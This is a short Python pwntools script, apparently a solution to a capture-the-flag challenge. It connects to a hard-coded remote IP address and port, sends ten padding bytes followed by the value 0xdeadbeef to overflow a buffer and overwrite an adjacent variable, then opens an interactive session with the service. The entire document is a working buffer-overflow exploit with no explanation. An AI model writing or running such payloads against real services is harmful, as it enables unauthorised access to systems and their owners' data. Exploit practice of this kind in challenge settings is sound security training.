from pwn import *
import socket
con = remote('68.183.158.95', 8989)
payload = b'A' * 10
payload += b'\xef\xbe\xad\xde'
con.sendline(payload)

con.interactive()
